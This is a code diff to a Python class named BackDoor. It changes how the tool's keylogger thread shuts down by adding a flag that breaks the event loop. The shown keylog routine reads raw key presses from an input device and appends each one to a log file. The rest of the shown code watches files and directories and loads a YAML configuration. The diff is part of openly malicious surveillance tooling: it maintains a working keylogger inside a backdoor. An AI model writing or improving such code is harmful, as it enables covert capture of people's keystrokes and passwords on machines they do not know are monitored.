@@ -141,6 +141,7 @@ class BackDoor:
         self.watch_dir = ""
         self.watch_file = ""
         self.watch_status = False
+        self.flag = False
 
     def start(self):
         self.process_yaml()
@@ -162,7 +163,7 @@ class BackDoor:
         except KeyboardInterrupt as e:
             observer.stop()
             observer.join()
-            keylog_t.stop()
+            self.flag = True # Set the flag to stop the keylogger thread
             keylog_t.join()
             sys.exit(" Closed")
         except FileNotFoundError as e:
@@ -178,6 +179,8 @@ class BackDoor:
     async def keylog(self, device):
         with open(self.log, 'a+') as f:
             async for event in device.async_read_loop():
+                if self.flag:
+                    break
                 if event.type == ecodes.EV_KEY and event.value == 1:
                     try:
                         f.write(key_code_map[event.code])
